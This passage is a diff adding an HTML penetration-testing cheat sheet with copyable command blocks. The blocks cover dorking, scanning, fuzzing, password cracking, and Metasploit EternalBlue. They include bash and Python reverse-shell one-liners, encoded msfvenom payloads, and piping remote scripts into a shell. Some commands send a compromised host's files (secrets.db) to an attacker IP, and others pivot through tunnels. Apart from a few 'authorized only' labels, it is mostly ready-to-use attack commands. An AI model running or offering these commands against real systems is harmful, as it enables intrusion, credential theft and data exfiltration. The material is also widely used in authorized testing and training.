+                    <p class="section-desc">Using advanced search operators (Dorks) to discover exposed files, directories, and misconfigurations.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Find sensitive files (.pdf, .xls) on target domain
+site:target.com filetype:pdf confidential
+site:target.com filetype:xls password
+
+# Find public login/admin panels
+intitle:"login page" inurl:admin site:target.com
+
+# Find exposed configuration or log files
+inurl:wp-config.php OR inurl:.env filetype:txt
+intitle:"index of /" log
+
+# Find cached pages to check for old data exposure
+cache:https://target.com/page-with-old-data
+
+# Restrict results to a specific file type AND title match
+intitle:"report" filetype:docx site:target.com
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-3">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">3.</span> SEO & Indexation Security
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Testing for misconfigurations in robots.txt, meta tags, and canonical URLs.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Check for security-sensitive disallow rules in robots.txt
+curl -s https://example.com/robots.txt | grep -i "disallow"
+
+# Identify sensitive meta robots tags
+grep -i 'meta name="robots"' page_source.html
+
+# Check for canonical tag misconfigurations
+grep -i '&lt;link rel="canonical"' page_source.html
+
+# Check for unintended parameter indexation
+site:example.com inurl:sessionid= OR inurl:PHPSESSID=
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-4">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">4.</span> Subdomain & DNS Enumeration
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Discovering subdomains and advanced DNS records using specialized tools.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Amass (passive + active + brute)
+amass enum -d example.com -o amass.txt
+
+# Subfinder (fast passive)
+subfinder -d example.com -o subfinder.txt
+
+# DNS recon
+dnsrecon -d example.com -t std,brt,srv
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-5">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">5.</span> Port & Service Discovery
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Aggressive port scanning, service versioning, and banner grabbing.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Nmap (version, default scripts, full ports)
+nmap -sC -sV -p- -T4 --min-rate 1000 -oA nmap-full 192.0.2.0/24
+
+# Host discovery (ping scan)
+nmap -sn 192.0.2.0/24
+
+# Banner grab with netcat (HTTP 80)
+nc -vz 192.0.2.10 80
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-6">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">6.</span> Web Discovery & Fuzzing
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Bruteforcing directories, files, and virtual hosts.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># ffuf (directory/file fuzzing)
+ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -mc 200,301,302 -o ffuf.json
+
+# gobuster (dir + vhost)
+gobuster dir -u https://example.com/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobuster.txt
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-7">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">7.</span> Web Application Testing
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Quick vulnerability checks for common web flaws.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># nikto (webserver checks)
+nikto -h https://example.com -output nikto.txt
+
+# sqlmap (ONLY in-scope &amp; lab)
+sqlmap -u "https://example.com/vuln.php?id=1" --batch --dbs
+
+# XSS testing (lab only)
+xsstrike -u "https://example.com/page?param=1"
+
+# parameter discovery
+arjun -u "https://example.com/page" -o arjun.txt
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-8">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">8.</span> Vulnerability Scanning & SCA
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Automated vulnerability template scanning, SBOM generation, and analysis.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># nuclei (fast templates)
+nuclei -l hosts.txt -t cves/ -o nuclei_results.txt
+
+# syft -&gt; generate SBOM (Software Bill of Materials)
+syft packages dir:./project -o json &gt; sbom.json
+
+# grype -&gt; scan SBOM
+grype sbom:sbom.json
+
+# query NVD (example)
+curl -s "https://services.nvd.nist.gov/rest/json/cve/1.0/CVE-2021-44228" | jq .
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-9">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">9.</span> Passwords, Credentials & AD Tooling
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Online bruteforce (authorized only), offline hash cracking, and Active Directory enumeration.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># hydra (online bruteforce) - AUTHORIZED ONLY
+hydra -L users.txt -P passwords.txt -t 4 ssh://192.0.2.10 -o hydra-ssh.txt
+
+# john / hashcat (offline cracking)
+john --wordlist=/usr/share/wordlists/rockyou.txt hashfile.txt
+# hashcat example
+# hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
+
+# impacket (examples: secretsdump)
+python3 /opt/impacket/examples/secretsdump.py domain/USER:PASS -outputfile secrets
+
+# BloodHound collection
+Invoke-BloodHound -CollectionMethod All -ZipFileName bloodhound.zip
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-10">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">10.</span> Exploitation: Metasploit Framework (MSF)
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Core MSF commands for searching, configuring, and executing exploits.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># start msfconsole
+msfconsole
+
+# search
+search cve:2017-0143
+search type:exploit platform:windows smb
+
+# use exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# show/set options
+show options
+set RHOSTS 192.168.1.0/24
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.0.0.5
+
+# check (non-destructive)
+check
+
+# exploit (authorized/lab only)
+exploit
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-11">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">11.</span> Post-Exploitation: Shells & Enumeration
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Listener commands, common reverse shell one-liners, and local privilege escalation.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># netcat listener (catch reverse shells)
+nc -lvnp 4444
+
+# bash reverse shell
+bash -i &gt;&amp; /dev/tcp/10.0.0.5/4444 0&gt;&amp;1
+
+# python reverse shell
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+# linux enumeration (lab)
+curl -s https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh | sh
+
+# windows enumeration
+.\winpeas.exe
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-12">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">12.</span> Network & TLS Checks
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Traffic capture, packet analysis, and SSL/TLS configuration checks.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># tcpdump (capture 1000 packets on eth0)
+tcpdump -i eth0 -w capture.pcap -c 1000
+
+# tshark read (filter HTTP)
+tshark -r capture.pcap -Y "http" -T fields -e http.host -e http.request.uri
+
+# quick cert info
+openssl s_client -connect example.com:443 &lt;/dev/null 2&gt;/dev/null | openssl x509 -noout -text
+
+# sslyze (comprehensive TLS scan)
+sslyze --regular example.com:443
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-13">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">13.</span> Vulnerability Research & PoC Triage
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Searching local exploit databases and safely running proof-of-concept code in isolation.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># searchsploit
+searchsploit "CVE-2021-44228"
+searchsploit -m 49993 # copy exploit by EDB ID
+
+# fetch PoC (read-only)
+curl -sL "https://raw.githubusercontent.com/user/repo/branch/poc.py" -o /tmp/poc.py
+
+# run PoC inside an isolated, no-network container (safest approach)
+docker run --rm -v /tmp/poc.py:/poc/poc.py --network none -it python:3.10 bash -c "python /poc/poc.py"
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-14">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">14.</span> Binary Reversing & Exploit Development
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Static analysis (ELF), ROP gadget hunting, and interactive debugging setup.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># ELF inspection
+readelf -h binary
+objdump -d binary | less
+strings binary
+
+# radare2
+r2 -AA binary
+
+# ropgadget (search for pop/ret gadgets)
+ropgadget --binary binary --only "pop|ret" &gt; gadgets.txt
+
+# gdb + pwndbg (start debugging session)
+gdb -q ./binary
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-15">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">15.</span> Fuzzing
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Instrumented binary fuzzing and HTTP request fuzzing for input discovery.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># AFL (instrumented binary)
+afl-fuzz -i in_dir -o out_dir -- ./target @@
+
+# wfuzz for HTTP (parameter discovery)
+wfuzz -c -z file,/usr/share/wordlists/parameters.txt --hc 404 "https://example.com/vuln?FUZZ=1"
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-16">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">16.</span> Mobile & Firmware Analysis
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Decompilation of APKs, dynamic runtime analysis (Frida), and firmware extraction.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># android decompile / inspect (apktool)
+apktool d app.apk -o app_src
+
+# android decompile / inspect (jadx)
+jadx -d out app.apk
+
+# frida (dynamic hooks) - authorized/lab only
+frida -U -f com.example.app -l script.js --no-pause
+
+# firmware extraction
+binwalk -e firmware.bin
+strings firmware.bin | grep -i password
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-17">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">17.</span> Safe PoC Testing & Logging
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Techniques for safe, reproducible testing environments and comprehensive logging.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># isolated container (no external network)
+docker run --rm --network none -v $(pwd):/work -it ubuntu:22.04 bash
+
+# spin up target service in container (lab)
+docker run --rm -p 8080:80 vuln-app:latest
+
+# logging with timestamps &amp; tool version
+(tool --version 2&gt;&amp;1 ; date; tool [args]) |&amp; tee logfile.txt
+
+# save JSON where possible for easy parsing
+nuclei -l hosts.txt -o nuclei.json -oJ nuclei.json
+ffuf -u https://example.com/FUZZ -w /wordlist.txt -o ffuf.json -of json
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-18">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">18.</span> Evasion & msfvenom Payloads
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Generating and encoding reverse shell payloads. AUTHORIZED USE ONLY.</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Windows Reverse Shell (Encoded 3 times)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe &gt; /root/Desktop/payload-enc.exe
+
+# Linux Python Reverse Shell (Raw Output, useful for injection)
+msfvenom -p cmd/unix/reverse_python LHOST=10.0.0.5 LPORT=4444 -f raw
+
+# Windows ASP Payload for Web Server Injection
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f asp &gt; shell.asp
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-19">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">19.</span> File Transfer (In-Memory & On-Disk)
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Common methods to transfer files to and from a compromised host (Linux/Windows).</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Attacker: Python HTTP Server (Serving files)
+python3 -m http.server 8000
+
+# Target (Linux): Download file via wget (Attacker IP: 10.0.0.5)
+wget http://10.0.0.5:8000/tool.sh
+
+# Target (Linux): Download file via curl (In-Memory execution, safer)
+curl http://10.0.0.5:8000/script.sh | bash
+
+# Attacker: Netcat Listener (Receive file: 'data.txt' from target)
+nc -l -p 8888 &gt; received_data.txt
+
+# Target: Netcat Transfer (Send file: 'secrets.db' to Attacker IP: 10.0.0.5)
+nc 10.0.0.5 8888 &lt; secrets.db
+
+# Target (Windows): Download file via PowerShell (IEX)
+IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.5:8000/shell.ps1')
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+            <div class="section-card" id="section-20">
+                <div class="section-header">
+                    <h2 class="section-title">
+                        <span style="color: var(--text-muted); margin-right: 8px;">20.</span> Tunneling & Pivoting
+                    </h2>
+                    <svg class="collapse-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <polyline points="6 9 12 15 18 9"></polyline>
+                    </svg>
+                </div>
+                <div class="section-content">
+                    <p class="section-desc">Establishing network access to otherwise unreachable internal networks from a compromised host (pivoting).</p>
+                    <div class="code-container">
+                        <button class="copy-btn">
+                            <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
+                                <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path>
+                            </svg>
+                            Copy
+                        </button>
+                        <pre><code class="language-bash"># Local SSH Port Forward (Tunnel local port to remote target)
+ssh -L 8080:192.168.1.10:80 user@jumpbox.corp
+
+# Reverse SSH Tunnel (Target connects back to attacker to create a forward)
+ssh -R 9000:127.0.0.1:80 user@10.0.0.5
+
+# Metasploit Portfwd (Meterpreter session: tunnel target-side port to local)
+portfwd add -l 3389 -r 192.168.1.15 -p 3389
+
+# SOCKS Proxy via Metasploit (Enable proxy via a Meterpreter session)
+use auxiliary/server/socks_proxy
+set SRVHOST 0.0.0.0
+set SRVPORT 1080
+run
+
+# Chisel (Attacker: SOCKS server)
+./chisel server -p 8000 --socks5
+
+# Chisel (Target: Connect to server and create tunnel)
+./chisel client 10.0.0.5:8000 R:1080:socks
+</code></pre>
+                    </div>
+                </div>
+            </div>
+
+        </main>
+    </div>
+
+    <script>
+        // Simple logic for syntax highlighting
+        function highlightSyntax(code) {
+            let lines = code.split('\n');
+            let highlighted = lines.map(line => {
+                if(line.trim().startsWith('#')) {
+                    return `<span class="comment">${line}</span>`;
+                } else if(line.trim() !== '') {
+                    // Very basic command highlighting
+                    let parts = line.split(' ');
+                    if(parts.length > 0) {
+                        parts[0] = `<span class="command">${parts[0]}</span>`;
+                        for(let i=1; i<parts.length; i++) {
+                            if(parts[i].startsWith('-')) {
+                                parts[i] = `<span class="arg">${parts[i]}</span>`;
+                            }
+                        }
+                    }
+                    return parts.join(' ');
+                }
+                return line;
+            });
+            return highlighted.join('\n');
+        }
+
+        // Setup Copy buttons
+        function copyToClipboard(button, text) {
+            navigator.clipboard.writeText(text).then(() => {
+                const originalText = button.innerHTML;
+                button.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"></polyline></svg> Copied!';
+                button.style.background = 'var(--accent-green)';
+                button.style.color = '#000';
+                setTimeout(() => {
+                    button.innerHTML = originalText;
+                    button.style.background = '';
+                    button.style.color = '';
+                }, 2000);
+            });
+        }
+
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+            btn.addEventListener('click', (e) => {
+                const codeBlock = e.target.closest('.code-container').querySelector('code');
+                // Extract raw text without HTML tags for copying
+                const rawText = codeBlock.innerText; 
+                copyToClipboard(btn, rawText);
+            });
+        });
+
+        // Setup search functionality
+        const searchInput = document.getElementById('searchInput');
+        const sections = document.querySelectorAll('.section-card');
+
+        searchInput.addEventListener('input', (e) => {
+            const term = e.target.value.toLowerCase();
+            
+            sections.forEach(section => {
+                const text = section.innerText.toLowerCase();
+                if (text.includes(term)) {
+                    section.style.display = 'block';
+                    // Automatically uncollapse if it matches search
+                    if(term.length > 0) {
+                        section.classList.remove('collapsed');
+                    }
+                } else {
+                    section.style.display = 'none';
+                }
+            });
+        });
+        
+        // Setup collapse functionality
+        document.querySelectorAll('.section-header').forEach(header => {
+            header.addEventListener('click', () => {
+                const card = header.closest('.section-card');
+                card.classList.toggle('collapsed');
+            });
+        });
+
